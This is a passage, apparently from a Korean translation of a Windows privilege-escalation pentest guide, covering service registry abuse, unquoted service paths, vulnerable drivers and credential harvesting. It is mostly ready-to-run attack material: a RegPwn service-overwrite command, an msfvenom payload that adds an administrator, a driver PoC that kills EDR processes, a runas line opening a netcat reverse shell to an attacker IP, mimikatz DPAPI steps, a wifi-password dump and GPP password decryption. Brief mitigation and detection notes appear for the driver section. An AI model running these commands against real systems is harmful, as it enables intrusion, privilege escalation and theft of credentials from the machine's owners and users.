3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`에 **oplock**을 걸어 **Win the race** 하십시오; oplock이 발동하면 **HKLM Session ATConfig** 키를 보호된 HKLM 대상로 향하는 **registry link**로 교체합니다.
4. SYSTEM이 공격자가 선택한 값을 리디렉션된 HKLM 경로에 기록합니다.

임의의 HKLM 값 쓰기가 가능해지면, 서비스 구성 값을 덮어써서 LPE로 전환합니다:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/command line)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

일반 사용자가 시작할 수 있는 서비스를 선택하세요(예: **`msiserver`**) 그리고 쓰기 이후에 그것을 트리거합니다. **Note:** 공개 익스플로잇 구현은 레이스의 일부로 **locks the workstation** 합니다.

Example tooling (RegPwn BOF / standalone):
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory 권한

레지스트리에 대해 이 권한이 있다면, 이는 **이 레지스트리에서 하위 레지스트리를 생성할 수 있습니다**를 의미합니다. Windows 서비스의 경우 이는 **임의의 코드를 실행하기에 충분합니다:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### 따옴표 없는 서비스 경로

실행 파일 경로가 따옴표로 감싸져 있지 않으면, Windows는 공백 이전의 모든 끝나는 부분을 실행하려고 시도합니다.

예를 들어, 경로 _C:\Program Files\Some Folder\Service.exe_ 의 경우 Windows는 다음을 실행하려고 시도합니다:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
내장된 Windows 서비스에 해당하는 항목을 제외하고, 따옴표로 묶이지 않은 모든 서비스 경로를 나열하세요:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**탐지하고 악용할 수 있습니다** 이 취약점은 metasploit으로 다음을 통해 탐지 및 악용할 수 있습니다: `exploit/windows/local/trusted\_service\_path` 수동으로 서비스 바이너리를 metasploit으로 생성할 수 있습니다:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 복구 작업

Windows에서는 서비스가 실패할 경우 수행할 작업을 사용자가 지정할 수 있습니다. 이 기능은 특정 binary를 가리키도록 구성될 수 있습니다. 만약 이 binary를 교체할 수 있다면, privilege escalation이 발생할 수 있습니다. 자세한 내용은 [official documentation](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>)에서 확인하세요.

## 애플리케이션

### 설치된 애플리케이션

**permissions of the binaries**와 **폴더**의 권한을 확인하세요 (바이너리를 덮어쓸 수 있다면 privilege escalation이 가능할 수 있습니다) ([DLL Hijacking](dll-hijacking/index.html)).
```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```
### 쓰기 권한

특정 파일을 읽기 위해 일부 config file을 수정할 수 있는지, 또는 Administrator 계정에 의해 실행될 binary를 수정할 수 있는지 확인하세요 (schedtasks).

시스템에서 취약한 폴더/파일 권한을 찾는 방법은 다음과 같습니다:
```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```
### Notepad++ plugin autoload persistence/execution

Notepad++는 `plugins` 하위 폴더에 있는 모든 plugin DLL을 자동으로 로드합니다. 쓰기 가능한 portable/copy 설치가 있는 경우, 악성 plugin을 배치하면 매 실행 시마다 `notepad++.exe` 내부에서 자동으로 code execution이 발생합니다( `DllMain` 및 plugin callbacks 포함).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### 시작 시 실행

**다른 사용자로 실행될 registry 또는 binary를 덮어쓸 수 있는지 확인하세요.**\
**읽어보세요** **다음 페이지**에서 권한 상승에 흥미로운 **autoruns locations to escalate privileges**에 대해 더 알아보세요:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### 드라이버

가능한 **third party weird/vulnerable** drivers를 찾아보세요
```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```
만약 드라이버가 arbitrary kernel read/write primitive를 노출한다면 (poorly designed IOCTL handlers에서 흔함), 커널 메모리에서 SYSTEM token을 직접 훔쳐 권한 상승할 수 있습니다. 단계별 기법은 다음에서 확인하세요:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

공격자가 제어하는 Object Manager 경로를 여는 취약한 호출과 관련된 race-condition 버그의 경우, 조회를 의도적으로 느리게(최대 길이 컴포넌트 사용 또는 깊은 디렉터리 체인) 하면 윈도우가 마이크로초에서 수십 마이크로초로 늘어납니다:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

#### Registry hive 메모리 손상 프리미티브

최신 hive 취약점은 결정론적 레이아웃을 조성하고, 쓰기 가능한 HKLM/HKU 하위 항목을 악용하며, 커스텀 드라이버 없이도 메타데이터 손상을 kernel paged-pool overflows로 전환할 수 있게 합니다. 전체 체인은 다음에서 학습하세요:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### Abusing missing FILE_DEVICE_SECURE_OPEN on device objects (LPE + EDR kill)

일부 서명된 서드파티 드라이버는 IoCreateDeviceSecure를 통해 강력한 SDDL로 device object를 생성하지만 DeviceCharacteristics에 FILE_DEVICE_SECURE_OPEN을 설정하는 것을 잊습니다. 이 플래그가 없으면, 추가 컴포넌트를 포함하는 경로로 디바이스를 열 때 secure DACL이 강제되지 않아 권한 없는 사용자가 다음과 같은 네임스페이스 경로를 사용해 핸들을 얻을 수 있습니다:

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (from a real-world case)

사용자가 해당 디바이스를 열 수 있게 되면, 드라이버가 노출한 특권 IOCTLs는 LPE 및 변조에 악용될 수 있습니다. 실제 사례에서 관찰된 예시 기능:
- 임의 프로세스에 대한 전체 권한 핸들을 반환 (token theft / SYSTEM shell via DuplicateTokenEx/CreateProcessAsUser).
- Unrestricted raw disk read/write (offline tampering, boot-time persistence tricks).
- 임의 프로세스를 종료, Protected Process/Light (PP/PPL) 포함 — 이를 통해 user land에서 kernel을 경유해 AV/EDR를 종료시킬 수 있습니다.

최소 PoC 패턴 (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```
개발자를 위한 완화 조치
- DACL로 제한하려는 device 객체를 생성할 때 항상 FILE_DEVICE_SECURE_OPEN을 설정하세요.
- 권한 있는 작업에 대해 호출자 컨텍스트를 검증하세요. 프로세스 종료나 핸들 반환을 허용하기 전에 PP/PPL 체크를 추가하세요.
- IOCTLs (access masks, METHOD_*, input validation)를 제한하고 직접적인 커널 권한 대신 brokered models를 고려하세요.

Detection ideas for defenders
- 의심스러운 디바이스 이름(예: \\ .\\amsdk*)에 대한 user-mode opens 및 남용을 나타내는 특정 IOCTL 시퀀스를 모니터링하세요.
- Microsoft’s vulnerable driver blocklist (HVCI/WDAC/Smart App Control)를 적용하고 자체 허용/차단 목록을 유지하세요.


## PATH DLL Hijacking

만약 **write permissions inside a folder present on PATH**가 있다면, 프로세스에 의해 로드된 DLL을 hijack하여 **escalate privileges**할 수 있습니다.

Check permissions of all folders inside PATH:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
이 검사를 악용하는 방법에 대한 자세한 정보:

{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## 네트워크

### 공유
```bash
net view #Get a list of computers
net view /all /domain [domainname] #Shares on the domains
net view \\computer /ALL #List shares of a computer
net use x: \\computer\share #Mount the share locally
net share #Check current shares
```
### hosts file

hosts file에 하드코딩된 다른 알려진 컴퓨터가 있는지 확인하세요
```
type C:\Windows\System32\drivers\etc\hosts
```
### 네트워크 인터페이스 & DNS
```
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```
### Open Ports

외부에서 **제한된 서비스**를 확인하세요
```bash
netstat -ano #Opened ports?
```
### 라우팅 테이블
```
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```
### ARP 테이블
```
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,L
```
### 방화벽 규칙

[**방화벽 관련 명령은 이 페이지를 확인하세요**](../basic-cmd-for-pentesters.md#firewall) **(규칙 나열, 규칙 생성, 비활성화 등)**

추가로[네트워크 열거를 위한 명령들](../basic-cmd-for-pentesters.md#network)

### Windows Subsystem for Linux (wsl)
```bash
C:\Windows\System32\bash.exe
C:\Windows\System32\wsl.exe
```
바이너리 `bash.exe`는 `C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash_[...]\bash.exe`에서도 찾을 수 있습니다

root 사용자 권한을 얻으면 아무 포트에서나 리스닝할 수 있습니다 (포트에서 리스닝하기 위해 처음으로 `nc.exe`를 사용할 때, GUI를 통해 `nc`를 방화벽에서 허용할지 묻습니다).
```bash
wsl whoami
./ubuntun1604.exe config --default-user root
wsl whoami
wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
```
To easily start bash as root, you can try `--default-user root`

You can explore the `WSL` filesystem in the folder `C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\`

## Windows 자격 증명

### Winlogon 자격 증명
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```
### 자격 증명 관리자 / Windows vault

From [https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)\
Windows Vault는 서버, 웹사이트 및 기타 프로그램에 대한 사용자 자격 증명을 저장하며, 이는 **Windows**가 **사용자를 자동으로 로그인시킬 수 있다**는 것을 의미합니다. 처음에는 사용자가 Facebook 자격 증명, Twitter 자격 증명, Gmail 자격 증명 등을 저장해 브라우저에서 자동으로 로그인할 수 있는 것처럼 보일 수 있습니다. 하지만 그렇지 않습니다.

Windows Vault는 Windows가 사용자를 자동으로 로그인시킬 수 있는 자격 증명을 저장하므로, 이는 리소스(서버 또는 웹사이트)에 접근하기 위해 자격 증명이 필요한 모든 **Windows application that needs credentials to access a resource**가 **Credential Manager를 활용할 수 있고** 제공된 자격 증명을 사용하여 사용자가 매번 사용자 이름과 비밀번호를 입력하지 않아도 된다는 뜻입니다.

응용 프로그램이 Credential Manager와 상호작용하지 않는 한, 특정 리소스에 대한 자격 증명을 사용할 수 없을 것입니다. 따라서 애플리케이션에서 vault를 사용하려면 기본 저장 vault에서 해당 리소스의 자격 증명을 가져오기 위해 **credential manager와 통신하고 해당 리소스의 자격 증명을 요청해야 합니다**.

머신에 저장된 자격 증명을 나열하려면 `cmdkey`를 사용하세요.
```bash
cmdkey /list
Currently stored credentials:
Target: Domain:interactive=WORKGROUP\Administrator
Type: Domain Password
User: WORKGROUP\Administrator
```
그런 다음 저장된 자격 증명을 사용하기 위해 `runas`를 `/savecred` 옵션과 함께 사용할 수 있습니다. 다음 예시는 SMB 공유를 통해 원격 바이너리를 호출하는 예입니다.
```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```
`runas`를 제공된 자격 증명 세트와 함께 사용하기.
```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```
참고: mimikatz, lazagne, [credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html), [VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html), 또는 [Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1).

### DPAPI

**Data Protection API (DPAPI)**는 데이터를 위한 대칭 암호화 방법을 제공하며, 주로 Windows 운영 체제 내에서 비대칭 개인키의 대칭 암호화에 사용됩니다. 이 암호화는 엔트로피에 크게 기여하는 사용자 또는 시스템 비밀을 활용합니다.

**DPAPI는 사용자의 로그인 비밀에서 파생된 대칭 키를 통해 키를 암호화할 수 있게 합니다**. 시스템 암호화가 적용되는 경우에는 시스템의 도메인 인증 비밀을 사용합니다.

DPAPI를 사용해 암호화된 사용자 RSA 키는 `%APPDATA%\Microsoft\Protect\{SID}` 디렉터리에 저장되며, 여기서 `{SID}`는 사용자의 [Security Identifier](https://en.wikipedia.org/wiki/Security_Identifier)를 나타냅니다. **사용자의 개인 키를 보호하는 마스터 키와 동일한 파일에 함께 위치한 DPAPI 키는** 일반적으로 64바이트의 임의 데이터로 구성됩니다. (이 디렉터리는 접근이 제한되어 있어 CMD에서 `dir` 명령으로 내용을 나열할 수 없지만 PowerShell에서는 나열할 수 있다는 점에 유의하세요).
```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```
**mimikatz module** `dpapi::masterkey`를 적절한 인자(`/pvk` 또는 `/rpc`)와 함께 사용하여 이를 복호화할 수 있습니다.

**마스터 비밀번호로 보호된 자격 증명 파일**은 보통 다음 위치에 있습니다:
```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```
You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt.\
`sekurlsa::dpapi` 모듈을 사용하면 (root인 경우) **memory**에서 많은 DPAPI **masterkeys**를 추출할 수 있습니다.

{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell Credentials

PowerShell credentials는 스크립팅 및 자동화 작업에서 암호화된 자격 증명을 편리하게 저장하는 수단으로 자주 사용됩니다. 이 자격 증명은 DPAPI로 보호되며, 일반적으로 생성된 동일한 컴퓨터에서 동일한 사용자만 복호화할 수 있습니다.

To **decrypt** a PS credentials from the file containing it you can do:
```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```
### Wifi
```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```
### Saved RDP Connections

다음 위치에서 찾을 수 있습니다: `HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers\`\
및 `HKCU\Software\Microsoft\Terminal Server Client\Servers\`

### 최근 실행된 명령
```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```
### **원격 데스크톱 자격 증명 관리자**
```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```
Use the **Mimikatz** `dpapi::rdg` module with appropriate `/masterkey` to **decrypt any .rdg files**\
적절한 `/masterkey`와 함께 **Mimikatz** `dpapi::rdg` 모듈을 사용하여 **decrypt any .rdg files**\
You can **extract many DPAPI masterkeys** from memory with the Mimikatz `sekurlsa::dpapi` module  
Mimikatz `sekurlsa::dpapi` 모듈로 메모리에서 **extract many DPAPI masterkeys**할 수 있습니다.

### Sticky Notes

Windows 워크스테이션에서 많은 사용자가 StickyNotes 앱에 **비밀번호를 저장**하거나 기타 정보를 보관하는데, 그것이 데이터베이스 파일이라는 사실을 모르는 경우가 많습니다. 이 파일은 `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite`에 위치하며 항상 찾아서 조사해볼 가치가 있습니다.

### AppCmd.exe

**Note that to recover passwords from AppCmd.exe you need to be Administrator and run under a High Integrity level.**\
**AppCmd.exe**는 `%systemroot%\system32\inetsrv\` 디렉터리에 있습니다.\
이 파일이 존재하면 일부 **credentials**가 구성되어 있고 **recovered**될 수 있습니다.

This code was extracted from [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1):
```bash
function Get-ApplicationHost {
$OrigError = $ErrorActionPreference
$ErrorActionPreference = "SilentlyContinue"

# Check if appcmd.exe exists
if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
# Create data table to house results
$DataTable = New-Object System.Data.DataTable

# Create and name columns in the data table
$Null = $DataTable.Columns.Add("user")
$Null = $DataTable.Columns.Add("pass")
$Null = $DataTable.Columns.Add("type")
$Null = $DataTable.Columns.Add("vdir")
$Null = $DataTable.Columns.Add("apppool")

# Get list of application pools
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

# Get application pool name
$PoolName = $_

# Get username
$PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
$PoolUser = Invoke-Expression $PoolUserCmd

# Get password
$PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
$PoolPassword = Invoke-Expression $PoolPasswordCmd

# Check if credentials exists
if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
}
}

# Get list of virtual directories
Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

# Get Virtual Directory Name
$VdirName = $_

# Get username
$VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
$VdirUser = Invoke-Expression $VdirUserCmd

# Get password
$VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
$VdirPassword = Invoke-Expression $VdirPasswordCmd

# Check if credentials exists
if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
# Add credentials to database
$Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
}
}

# Check if any passwords were found
if( $DataTable.rows.Count -gt 0 ) {
# Display results in list view that can feed into the pipeline
$DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
}
else {
# Status user
Write-Verbose 'No application pool or virtual directory passwords were found.'
$False
}
}
else {
Write-Verbose 'Appcmd.exe does not exist in the default location.'
$False
}
$ErrorActionPreference = $OrigError
}
```
### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe`가 있는지 확인하세요.\
설치 프로그램은 **SYSTEM privileges로 실행됩니다**, 많은 것이 **DLL Sideloading (정보 출처** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**
```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```
## 파일 및 레지스트리 (Credentials)

### Putty Creds
```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```
### Putty SSH 호스트 키
```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```
### 레지스트리의 SSH keys

SSH private keys는 레지스트리 키 `HKCU\Software\OpenSSH\Agent\Keys` 내부에 저장될 수 있으므로 그 안에 흥미로운 것이 있는지 확인해야 합니다:
```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```
해당 경로에서 항목을 찾으면 대개 저장된 SSH key일 것입니다. 해당 키는 암호화되어 저장되지만 [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract)를 사용하면 쉽게 복호화할 수 있습니다.\
이 기술에 대한 자세한 정보: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

만약 `ssh-agent` 서비스가 실행 중이 아니고 부팅 시 자동으로 시작되게 하려면 다음을 실행하세요:
```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```
> [!TIP]
> 이 기술은 더 이상 유효하지 않은 것 같습니다. ssh 키를 생성하고 `ssh-add`로 추가한 뒤 ssh로 머신에 로그인해봤습니다. 레지스트리 HKCU\Software\OpenSSH\Agent\Keys는 존재하지 않았고 procmon은 asymmetric key authentication 동안 `dpapi.dll` 사용을 확인하지 못했습니다.

### 방치된 파일
```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```
다음과 같이 **metasploit**을 사용하여 이 파일들을 검색할 수도 있습니다: _post/windows/gather/enum_unattend_

예시 내용:
```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
<AutoLogon>
<Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
<Enabled>true</Enabled>
<Username>Administrateur</Username>
</AutoLogon>

<UserAccounts>
<LocalAccounts>
<LocalAccount wcm:action="add">
<Password>*SENSITIVE*DATA*DELETED*</Password>
<Group>administrators;users</Group>
<Name>Administrateur</Name>
</LocalAccount>
</LocalAccounts>
</UserAccounts>
```
### SAM & SYSTEM 백업
```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```
### 클라우드 자격 증명
```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```
### McAfee SiteList.xml

**SiteList.xml** 파일을 찾으세요.

### 캐시된 GPP 암호

이전에는 Group Policy Preferences (GPP)를 이용해 여러 머신에 커스텀 로컬 관리자 계정을 배포할 수 있는 기능이 있었습니다. 그러나 이 방법에는 심각한 보안 결함이 있었습니다. 첫째, SYSVOL에 XML 파일로 저장된 Group Policy Objects (GPOs)는 모든 도메인 사용자가 접근할 수 있었습니다. 둘째, 공개적으로 문서화된 기본 키를 사용해 AES256으로 암호화된 이 GPP들 내의 비밀번호는 인증된 어떤 사용자라도 복호화할 수 있었습니다. 이는 사용자가 권한 상승을 얻을 수 있게 할 수 있어 심각한 위험을 초래했습니다.

이 위험을 완화하기 위해, 비어있지 않은 "cpassword" 필드를 포함한 로컬에 캐시된 GPP 파일을 검색하는 함수가 개발되었습니다. 해당 파일을 찾으면 함수는 비밀번호를 복호화하고 커스텀 PowerShell 객체를 반환합니다. 이 객체는 GPP에 대한 세부 정보와 파일의 위치를 포함하여 이 보안 취약점을 식별하고 수정하는 데 도움이 됩니다.

Search in `C:\ProgramData\Microsoft\Group Policy\history` or in _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (W Vista 이전)_ for these files:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPassword를 복호화하려면:**
```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```
crackmapexec를 사용하여 비밀번호를 얻기:
```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```
### IIS 웹 구성
```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```
자격 증명이 포함된 web.config 예시:
```xml
<authentication mode="Forms">
<forms name="login" loginUrl="/admin">
<credentials passwordFormat = "Clear">
<user name="Administrator" password="SuperAdminPassword" />
</credentials>
</forms>
</authentication>
```
### OpenVPN credentials
```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
$encryptedbytes=$item.'auth-data'
$entropy=$item.'entropy'
$entropy=$entropy[0..(($entropy.Length)-2)]

$decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
$encryptedBytes,
$entropy,
[System.Security.Cryptography.DataProtectionScope]::CurrentUser)

Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```
### 로그
```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```
### credentials 요청

